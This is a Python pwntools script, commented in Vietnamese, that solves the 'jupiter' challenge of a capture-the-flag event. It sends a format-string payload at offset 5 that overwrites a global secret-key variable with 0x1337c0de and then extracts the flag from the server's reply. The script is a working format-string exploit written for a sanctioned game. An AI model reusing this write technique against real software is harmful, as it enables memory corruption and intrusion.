from pwn import *

# --- Cấu hình ---
HOST = 'chal.sunshinectf.games'
PORT = 25607
BINARY_NAME = './jupiter'

# --- Thông tin ---
elf = context.binary = ELF(BINARY_NAME, checksec=False)
secret_key_addr = 0x404010
value_to_write = 0x1337c0de

# Chúng ta đã xác định được offset đúng là 5
offset = 5

log.info(f"Sử dụng offset đã xác định: {offset}")

try:
    p = remote(HOST, PORT)
    
    # Xây dựng payload với offset đã biết
    # write_size='byte' giúp tạo payload ngắn hơn và ổn định hơn
    payload = fmtstr_payload(offset, {secret_key_addr: value_to_write}, write_size='byte')
    
    log.info(f"Payload (length {len(payload)}): {payload}")

    # Đọc dòng chào mừng
    p.recvuntil(b'Enter data at your own risk: ')

    # Gửi payload
    p.sendline(payload)
    
    # Nhận phản hồi
    response = p.recvall(timeout=3)
    p.close()

    # --- In kết quả một cách an toàn ---
    print("\n\n======= KẾT QUẢ TỪ SERVER =======\n")
    
    # In dữ liệu raw (dạng bytes) để xem
    print("--- Dữ liệu Raw (Bytes) ---")
    print(response)
    print("-" * 30)
    
    # In dữ liệu đã giải mã, bỏ qua các ký tự lỗi
    print("\n--- Dữ liệu đã giải mã (Đã làm sạch) ---")
    # errors='ignore' sẽ bỏ qua các byte không hợp lệ thay vì gây lỗi
    cleaned_response = response.decode('utf-8', errors='ignore')
    print(cleaned_response)
    print("-" * 30)

    # Tìm và in flag
    import re
    match = re.search(r'sun\{.*?\}', cleaned_response)
    if match:
        log.success(f"Flag: {match.group(0)}")
    else:
        log.failure("Không tìm thấy flag trong phản hồi. Hãy kiểm tra output ở trên.")
        
except Exception as e:
    log.error(f"Đã xảy ra lỗi: {e}")